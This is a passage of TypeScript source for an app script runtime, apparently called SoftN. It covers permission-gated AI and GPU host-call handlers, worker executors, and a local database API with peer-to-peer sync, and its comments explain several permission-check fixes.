    const abortController = new AbortController();
    const timeout = setTimeout(() => abortController.abort(), 20_000);
    this.netAbortControllers.add(abortController);
    try {
      const resp = await fetch(this.storageEndpoint, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ op, ...args }),
        signal: abortController.signal,
        credentials: 'same-origin',
      });
      const text = await resp.text();
      let json: { ok?: boolean; result?: unknown; error?: string; retryAfter?: number } | null = null;
      try {
        json = JSON.parse(text);
      } catch {
        json = null;
      }
      if (!resp.ok || !json || json.ok !== true) {
        return {
          error: json?.error ?? `The storage server answered ${resp.status}.`,
          status: resp.status,
          retryAfter: json?.retryAfter,
        };
      }
      return json.result ?? null;
    } catch (err) {
      if (abortController.signal.aborted) return { error: 'The storage request timed out.' };
      return { error: err instanceof Error ? err.message : String(err) };
    } finally {
      clearTimeout(timeout);
      this.netAbortControllers.delete(abortController);
    }
  }

  // ── AI host call handlers ──

  private async getOnnxManager(): Promise<import('./ai-onnx-manager').OnnxManager> {
    if (!this.onnxManager) {
      const { OnnxManager } = await import('./ai-onnx-manager');
      this.onnxManager = new OnnxManager();
      if (this.bundleFileProvider) {
        this.onnxManager.setBundleFileProvider(this.bundleFileProvider);
      }
      if (this.permissionConfig?.permissions.ai) {
        this.onnxManager.setPermissionConfig(this.permissionConfig.permissions.ai);
      }
    }
    return this.onnxManager;
  }

  private async getTransformersManager(): Promise<
    import('./ai-transformers-manager').TransformersManager
  > {
    if (!this.transformersManager) {
      const { TransformersManager } = await import('./ai-transformers-manager');
      this.transformersManager = new TransformersManager();
      if (this.permissionConfig?.permissions.ai) {
        this.transformersManager.setPermissionConfig(this.permissionConfig.permissions.ai);
      }
    }
    return this.transformersManager;
  }

  private async handleAIGetCapabilities(): Promise<unknown> {
    // The only capability-shaped handler that answered anyone. It reports
    // webgpu/webgl/wasm availability and a maxModelSizeMB derived from
    // navigator.deviceMemory — a device fingerprint .logic has no other route
    // to — and it answered a bundle shipping no permission.json, and a bundle
    // whose consent bar was still up.
    this.checkPermission('ai');
    const { detectCapabilities } = await import('./ai-manager');
    return detectCapabilities();
  }

  private async handleAIOnnxLoadModel(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [sourceJson, optionsJson] = call.args;
    const source: ModelSource = JSON.parse(sourceJson);
    const options = optionsJson ? JSON.parse(optionsJson) : {};
    const mgr = await this.getOnnxManager();
    return mgr.loadModel(source, options);
  }

  private async handleAIOnnxRun(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [sessionId, feedsJson, optionsJson] = call.args;
    const feeds: OnnxFeeds = JSON.parse(feedsJson);
    const options: OnnxRunOptions = optionsJson ? JSON.parse(optionsJson) : {};
    const mgr = await this.getOnnxManager();
    return mgr.run(sessionId, feeds, options);
  }

  private async handleAIOnnxRelease(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [sessionId] = call.args;
    const mgr = await this.getOnnxManager();
    await mgr.release(sessionId);
    return { released: true };
  }

  private async handleAIPipeline(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [task, model, optionsJson] = call.args;
    const options: PipelineOptions = optionsJson ? JSON.parse(optionsJson) : {};
    const mgr = await this.getTransformersManager();
    return mgr.createPipeline(task as PipelineTask, model || undefined, options);
  }

  private async handleAIGenerate(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [pipelineId, prompt, optionsJson] = call.args;
    const options: GenerateOptions = optionsJson ? JSON.parse(optionsJson) : {};
    const mgr = await this.getTransformersManager();
    return mgr.generate(pipelineId, prompt, options);
  }

  private async handleAIEmbed(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [pipelineId, textsJson] = call.args;
    let texts: string | string[];
    try {
      texts = JSON.parse(textsJson);
    } catch {
      texts = textsJson;
    }
    const mgr = await this.getTransformersManager();
    return mgr.embed(pipelineId, texts);
  }

  private async handleAIClassify(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [pipelineId, text] = call.args;
    const mgr = await this.getTransformersManager();
    return mgr.classify(pipelineId, text);
  }

  private async handleAIRun(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [pipelineId, inputJson, optionsJson] = call.args;
    let input: unknown;
    try {
      input = JSON.parse(inputJson);
    } catch {
      input = inputJson;
    }
    const options = optionsJson ? JSON.parse(optionsJson) : undefined;
    const mgr = await this.getTransformersManager();
    return mgr.run(pipelineId, input, options);
  }

  private async handleAIReleaseAll(): Promise<unknown> {
    const promises: Promise<void | { released: boolean }>[] = [];
    if (this.onnxManager) promises.push(this.onnxManager.releaseAll());
    if (this.transformersManager) promises.push(this.transformersManager.releaseAll());
    if (this.gpuComputeManager) promises.push(this.gpuComputeManager.releaseAll());
    await Promise.all(promises);
    return { released: true };
  }

  private async handleAIModelLoad(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [modelId, optionsJson] = call.args;
    const options: DirectModelOptions & { modelClass?: string } = optionsJson
      ? JSON.parse(optionsJson)
      : {};
    const mgr = await this.getTransformersManager();
    return mgr.loadModel(modelId, options);
  }

  private async handleAIModelGenerate(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [modelHandle, messagesJson, optionsJson] = call.args;
    const messages: ChatMessage[] = JSON.parse(messagesJson);
    const options: GenerateOptions = optionsJson ? JSON.parse(optionsJson) : {};
    const mgr = await this.getTransformersManager();
    return mgr.generateFromModel(modelHandle, messages, options);
  }

  private async handleAIModelRelease(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('ai');
    const [modelHandle] = call.args;
    const mgr = await this.getTransformersManager();
    await mgr.releaseModel(modelHandle);
    return { released: true };
  }

  // ── GPU compute host call handlers ──

  private async getGpuComputeManager(): Promise<
    import('./ai-gpu-compute-manager').GpuComputeManager
  > {
    if (!this.gpuComputeManager) {
      const { GpuComputeManager } = await import('./ai-gpu-compute-manager');
      this.gpuComputeManager = new GpuComputeManager();
      if (this.bundleFileProvider) {
        this.gpuComputeManager.setBundleFileProvider(this.bundleFileProvider);
      }
      if (this.permissionConfig?.permissions.gpu) {
        this.gpuComputeManager.setPermissionConfig(this.permissionConfig.permissions.gpu);
      }
    }
    return this.gpuComputeManager;
  }

  private async handleGpuRequestDevice(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const options = call.args[0] ? JSON.parse(call.args[0]) : {};
    const mgr = await this.getGpuComputeManager();
    return mgr.requestDevice(options);
  }

  private async handleGpuCreateBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [sourceJson, usage] = call.args;
    const source = JSON.parse(sourceJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createBuffer(source, usage);
  }

  private async handleGpuWriteBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [bufferId, dataJson, dtype] = call.args;
    const data = JSON.parse(dataJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.writeBuffer(bufferId, data, (dtype || undefined) as any);
  }

  private async handleGpuCreateShader(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [sourceJson] = call.args;
    const source = JSON.parse(sourceJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createShader(source);
  }

  private async handleGpuCreatePipeline(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [optionsJson] = call.args;
    const options = JSON.parse(optionsJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.createPipeline(options);
  }

  private async handleGpuDispatch(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [pipelineId, bindingsJson, workgroupsJson] = call.args;
    const bindings = JSON.parse(bindingsJson);
    const workgroups = JSON.parse(workgroupsJson);
    const mgr = await this.getGpuComputeManager();
    return mgr.dispatch(pipelineId, bindings, workgroups);
  }

  private async handleGpuReadBuffer(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [bufferId] = call.args;
    const mgr = await this.getGpuComputeManager();
    return mgr.readBuffer(bufferId);
  }

  private async handleGpuRelease(call: PendingHostCall): Promise<unknown> {
    this.checkPermission('gpu');
    const [resourceId] = call.args;
    const mgr = await this.getGpuComputeManager();
    return mgr.release(resourceId);
  }

  private async handleGpuReleaseAll(): Promise<unknown> {
    // The only gpu handler that reached getGpuComputeManager unchecked, and the
    // getter only wires the declared limits into a manager it is creating. A
    // denied app calling this built the manager with no config at all, and the
    // `if (!this.gpuComputeManager)` cache meant the buffer cap and the shader
    // allowlist were then missing for the rest of the session.
    this.checkPermission('gpu');
    const mgr = await this.getGpuComputeManager();
    return mgr.releaseAll();
  }
}

/**
 * Create a SoftN script runtime
 * @param context - Script execution context
 * @param permissions - Optional permissions manifest from bundle for capability enforcement
 * @param appId - Optional app identifier for localStorage namespace isolation
 */
export function createScriptRuntime(
  context: ScriptContext,
  permissions?: AppPermissions,
  appId?: string,
  importResolver?: unknown,
  logicBasePath?: string,
  options?: ScriptRuntimeOptions,
  bundleFileProvider?: BundleFileProvider,
  externalFunctions?: Record<string, (...args: unknown[]) => unknown>
): ScriptRuntimeHandle {
  return new SoftNScriptRuntime(
    context,
    permissions,
    appId,
    importResolver,
    logicBasePath,
    options,
    bundleFileProvider,
    externalFunctions
  );
}

/**
 * The host-injected functions as the script sees them: a snapshot of every
 * synchronous primitive-valued getter, declared as a function returning its
 * value. This is the contract the main-thread runtime compiles (step 4 of its
 * loadScript), extracted so a script hosted in a worker is handed the same
 * declarations. `xdb_*` and `asset` are served by other bridges and skipped,
 * as they are there. The worker's snapshot is taken once, at load: nothing
 * refreshes it afterwards, where the main thread refreshes its table on every
 * call — a known gap, acceptable for values that do not move while an app runs.
 */
export function buildExternalValuesPreamble(
  externalFunctions: Record<string, (...args: unknown[]) => unknown> | null | undefined
): string {
  if (!externalFunctions) return '';
  const names: string[] = [];
  const values: unknown[] = [];
  for (const name of Object.keys(externalFunctions)) {
    if (!VALID_IDENTIFIER.test(name) || EXTERNAL_FUNCTION_RESERVED_NAMES.has(name)) continue;
    if (name.startsWith('xdb_') || name === 'asset') continue;
    let value: ExternalValueRead;
    try {
      const fn = externalFunctions[name];
      if (typeof fn !== 'function') continue;
      const result = fn();
      if (result != null && typeof (result as { then?: unknown }).then === 'function') {
        Promise.resolve(result).catch(() => {});
        continue;
      }
      value = normalizeExternalPrimitive(result);
    } catch {
      continue;
    }
    if (value === UNSUPPORTED_EXTERNAL_VALUE) continue;
    names.push(name);
    values.push(value);
  }
  if (names.length === 0) return '';
  const serialized = values.map((v) => (v === undefined ? 'undefined' : JSON.stringify(v))).join(',');
  let preamble = `let ${EXTERNAL_VALUES_VAR} = [${serialized}];
`;
  for (let i = 0; i < names.length; i++) {
    preamble += `function ${names[i]}() { return ${EXTERNAL_VALUES_VAR}[${i}]; }
`;
  }
  return preamble;
}

/** What the Web Worker runtime asks of the main thread; see `createHostCallExecutor`. */
export interface HostCallExecutor {
  executeHostCall(call: PendingHostCall): Promise<unknown>;
  cleanup(): void;
}

/**
 * A `softn.*` executor for a script that runs in a worker. It is the
 * main-thread runtime with no script loaded: the same handlers, the same
 * permission checks, the same file registry — only the VM is elsewhere.
 */
export function createHostCallExecutor(
  context: ScriptContext,
  permissions?: AppPermissions,
  appId?: string,
  importResolver?: unknown,
  logicBasePath?: string,
  options?: ScriptRuntimeOptions,
  bundleFileProvider?: BundleFileProvider,
  externalFunctions?: Record<string, (...args: unknown[]) => unknown>
): HostCallExecutor {
  const runtime = new SoftNScriptRuntime(
    context,
    permissions,
    appId,
    importResolver,
    logicBasePath,
    options,
    bundleFileProvider,
    externalFunctions
  );
  return {
    executeHostCall: (call) => runtime.executeHostCallExternal(call),
    cleanup: () => runtime.cleanup(),
  };
}

/**
 * Create an XDB module that uses the real XDB service with localStorage persistence
 * This replaces the old mock implementation with actual persistence.
 */
export function createPersistentXDBModule(appId?: string): XDBModule {
  // Import dynamically to avoid circular dependency
  // The XDB service is created lazily when needed
  let xdbService: import('./xdb').XDBService | null = null;

  const getXDB = async () => {
    if (!xdbService) {
      const { getXDB: getXDBInstance } = await import('./xdb');
      xdbService = getXDBInstance(appId);
    }
    return xdbService;
  };

  return {
    create: async (collection: string, data: Record<string, unknown>) => {
      const xdb = await getXDB();
      return xdb.isP2PAvailable()
        ? xdb.createAsync(collection, data)
        : xdb.create(collection, data);
    },

    update: async (id: string, data: Record<string, unknown>) => {
      const xdb = await getXDB();
      const record = xdb.isP2PAvailable() ? await xdb.updateAsync(id, data) : xdb.update(id, data);
      if (!record) {
        throw new Error(`Record not found: ${id}`);
      }
      return record;
    },

    delete: async (id: string) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        await xdb.deleteAsync(id);
      } else {
        xdb.delete(id);
      }
    },

    query: async (collection: string, filter?: Record<string, unknown>) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        return xdb.queryAsync(collection, filter ? { filter } : undefined);
      }
      return xdb.query(collection, filter ? { filter } : undefined);
    },

    get: async (collection: string, id: string) => {
      const xdb = await getXDB();
      if (xdb.isP2PAvailable()) {
        return xdb.getAsync(collection, id);
      }
      return xdb.get(collection, id);
    },

    sync: async () => {
      const xdb = await getXDB();
      return xdb.sync();
    },
  };
}

/**
 * DB namespace interface for direct use in <logic> blocks
 * Provides a clean, synchronous API for database operations
 */
export interface DBNamespace {
  query: (collection: string, filter?: Record<string, unknown>) => XDBRecord[];
  create: (collection: string, data: Record<string, unknown>) => XDBRecord;
  update: (id: string, data: Record<string, unknown>) => XDBRecord;
  delete: (id: string) => void;
  hardDelete: (collection: string, id: string) => void;
  get: (collection: string, id: string) => XDBRecord | null;
  /**
   * Prune a collection to keep at most `maxRecords` records.
   * Removes oldest records first (by created_at). Returns number of records removed.
   */
  prune: (collection: string, maxRecords: number) => number;
  /** Remove all records from a collection */
  clearCollection: (collection: string) => void;
  startSync: (room: string, options?: Record<string, unknown>) => void;
  stopSync: (room?: string) => void;
  getSyncStatus: (room?: string) => {
    connected: boolean;
    peers: number;
    room: string;
    peerId: string;
  };
  getSavedSyncRoom: () => string | null;
  /** Wait for the XDB service to finish initializing */
  ready: () => Promise<void>;
}

/**
 * Create a synchronous db namespace for use in <logic> blocks
 * This uses the XDB service synchronously for immediate data access
 */
export function createDBNamespace(
  getPermissionConfig?: () => PermissionConfig | null,
  appId?: string,
  syncEncryptionKeyHex?: string
): DBNamespace {
  // Import XDB directly - this module uses a singleton pattern
  // We use a wrapper that will lazily initialize
  let xdbService: import('./xdb').XDBService | null = null;
  let xdbPromise: Promise<import('./xdb').XDBService> | null = null;

  // Start loading XDB immediately but don't block
  const initXDB = async () => {
    if (!xdbPromise) {
      xdbPromise = import('./xdb').then((m) => {
        xdbService = m.getXDB(appId);
        return xdbService;
      });
    }
    return xdbPromise;
  };

  const getXDBSync = (): import('./xdb').XDBService => {
    if (!xdbService) {
      // If not yet loaded, trigger load and throw a meaningful error
      // In practice, by the time user actions happen, XDB should be loaded
      initXDB();
      throw new Error('XDB is still initializing. This should not happen in normal use.');
    }
    return xdbService;
  };

  return {
    query: (collection: string, filter?: Record<string, unknown>) => {
      const xdb = getXDBSync();
      return xdb.query(collection, filter ? { filter } : undefined);
    },

    create: (collection: string, data: Record<string, unknown>) => {
      const xdb = getXDBSync();
      return xdb.create(collection, data);
    },

    update: (id: string, data: Record<string, unknown>) => {
      const xdb = getXDBSync();
      const record = xdb.update(id, data);
      if (!record) {
        throw new Error(`Record not found: ${id}`);
      }
      return record;
    },

    delete: (id: string) => {
      const xdb = getXDBSync();
      xdb.delete(id);
    },

    hardDelete: (collection: string, id: string) => {
      const xdb = getXDBSync();
      xdb.hardDelete(collection, id);
    },

    get: (collection: string, id: string) => {
      const xdb = getXDBSync();
      return xdb.get(collection, id);
    },

    startSync: (room: string, options?: Record<string, unknown>) => {
      const permissionConfig = getPermissionConfig?.();
      // `permissionConfig?.permissions && !…sync?.enabled` short-circuited to
      // false when the config was absent, so the one path that starts WebRTC
      // replication of the whole database opened itself for exactly the bundles
      // the rest of the model trusts least. checkPermission('sync') and the
      // renderer's own xdb bridge both deny an absent config; this now agrees.
      if (!permissionConfig?.permissions?.sync?.enabled) {
        console.error(
          permissionConfig?.consentPending
            ? '[XDB Sync] Sync not allowed yet. Choose Allow in the permission bar to grant it.'
            : '[XDB Sync] Sync not permitted. Add sync.enabled to permission.json'
        );
        return;
      }
      const syncOpts: Record<string, unknown> = { room, ...(options || {}) };
      const sharedKey = appId ? `xdb-sync-shared:${appId}` : null;
      // Shared room: sharedRoom flag, legacy noEncrypt, or persisted from prior session
      let isShared = !!syncOpts.sharedRoom || !!syncOpts.noEncrypt;
      if (!isShared && sharedKey) {
        try {
          isShared = localStorage.getItem(sharedKey) === 'true';
        } catch {
          /* noop */
        }
      }
      if (isShared) {
        // Derive encryption key from room name — all peers use the same key.
        // y-webrtc runs PBKDF2(password, roomName) to produce AES-256-GCM.
        syncOpts.password = 'softn-shared:' + room;
        delete syncOpts.encryptionKey;
      } else if (syncEncryptionKeyHex && !syncOpts.encryptionKey) {
        syncOpts.encryptionKey = syncEncryptionKeyHex;
      }
      // Persist shared flag so auto-resume also uses room-key encryption
      if (isShared && sharedKey) {
        try {
          localStorage.setItem(sharedKey, 'true');
        } catch {
          /* noop */
        }
      }
      delete syncOpts.noEncrypt;
      delete syncOpts.sharedRoom;
      if (appId && !syncOpts.appId) {
        syncOpts.appId = appId;
      }
      import('./xdb-sync')
        .then((mod) => {
          _syncModuleCache = mod;
          mod.startSync(syncOpts as unknown as import('./xdb-sync').XDBSyncOptions);
        })
        .catch((err) => {
          console.error('[XDB Sync] Failed to start sync:', err);
        });
    },

    stopSync: (room?: string) => {
      import('./xdb-sync')
        .then(({ stopSync }) => {
          stopSync(room, appId);
        })
        .catch((err) => {
          console.error('[XDB Sync] Failed to stop sync:', err);
        });
    },

    getSyncStatus: (room?: string) => {
      if (_syncModuleCache) {
        const adapter = _syncModuleCache.getSyncAdapter(room);
        return adapter ? adapter.getStatus() : { connected: false, peers: 0, room: '', peerId: '' };
      }
      return { connected: false, peers: 0, room: '', peerId: '' };
    },

    getSavedSyncRoom: () => {
      const key = appId ? `xdb-sync-active-room:${appId}` : 'xdb-sync-active-room';
      try {
        return localStorage.getItem(key);
      } catch {
        return null;
      }
    },

    prune: (collection: string, maxRecords: number) => {
      const xdb = getXDBSync();
      const records = xdb.query(collection);
      if (records.length <= maxRecords) return 0;
      // Sort by created_at ascending (oldest first)
      const sorted = [...records].sort((a, b) =>
        (a.created_at || '').localeCompare(b.created_at || '')
      );
      const toRemove = sorted.slice(0, records.length - maxRecords);
      for (const rec of toRemove) {
        xdb.hardDelete(collection, rec.id);
      }
      return toRemove.length;
    },

    clearCollection: (collection: string) => {
      const xdb = getXDBSync();
      const records = xdb.query(collection);
      for (const rec of records) {
        xdb.hardDelete(collection, rec.id);
      }
    },

    ready: () => initXDB().then(() => {}),
  };
}

// Shared sync module cache — used by both createDBNamespace (script-runtime) and
// createXDBHelpers (SoftNRenderer) so getSyncStatus works regardless of which
// code path started the sync.
let _syncModuleCache: typeof import('./xdb-sync') | null = null;

export function getSyncModuleCache() {
  return _syncModuleCache;
}

export function setSyncModuleCache(mod: typeof import('./xdb-sync')) {
  _syncModuleCache = mod;
}

/**
 * Create a mock XDB module (for testing without persistence)
 * @deprecated Use createPersistentXDBModule() instead for real applications
 */
export function createMockXDBModule(): XDBModule {
  // For backwards compatibility, use the in-memory mock
  const collections = new Map<string, XDBRecord[]>();

  return {
    create: async (collection: string, data: Record<string, unknown>) => {
      const record: XDBRecord = {
        id:
          typeof crypto !== 'undefined' && crypto.randomUUID
            ? crypto.randomUUID()
            : `mock-${Date.now()}-${Math.random().toString(36).slice(2)}`,
        collection,
        data,
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        deleted: false,
      };

      if (!collections.has(collection)) {
        collections.set(collection, []);
      }
      collections.get(collection)!.push(record);

      return record;
    },

    update: async (id: string, data: Record<string, unknown>) => {
      for (const records of collections.values()) {
        const record = records.find((r) => r.id === id);
        if (record) {
          record.data = { ...record.data, ...data };
          record.updated_at = new Date().toISOString();
          return record;
        }
      }
      throw new Error(`Record not found: ${id}`);
    },

    delete: async (id: string) => {
      for (const records of collections.values()) {
        const record = records.find((r) => r.id === id);
        if (record) {
          record.deleted = true;
          record.updated_at = new Date().toISOString();
          return;
        }
      }
    },

    query: async (collection: string, filter?: Record<string, unknown>) => {
      const records = collections.get(collection) || [];
      return records.filter((r) => {
        if (r.deleted) return false;
        if (!filter) return true;

        for (const [key, value] of Object.entries(filter)) {
          if (r.data[key] !== value) return false;
        }
        return true;
      });
    },

    get: async (collection: string, id: string) => {
      const records = collections.get(collection) || [];
      return records.find((r) => r.id === id && !r.deleted) || null;
    },

    sync: async () => {
      console.log('Mock XDB sync (no-op)');
    },
  };
}

/**
 * Create a mock nav module
 */
export function createMockNavModule(onNavigate?: (page: string) => void): NavModule {
  return {
    goto: (page: string) => {
      console.log('[SoftN Nav] goto:', page);
      onNavigate?.(page);
    },
    back: () => {
      console.log('[SoftN Nav] back');
      if (typeof window !== 'undefined') {
        window.history.back();
      }
    },
    params: {},
  };
}

/**
 * Create a console module that forwards to the browser console
 */
export function createConsoleModule(): ConsoleModule {
  return {
    log: (...args: unknown[]) => console.log('[SoftN]', ...args),
    error: (...args: unknown[]) => console.error('[SoftN]', ...args),
    warn: (...args: unknown[]) => console.warn('[SoftN]', ...args),
  };
}
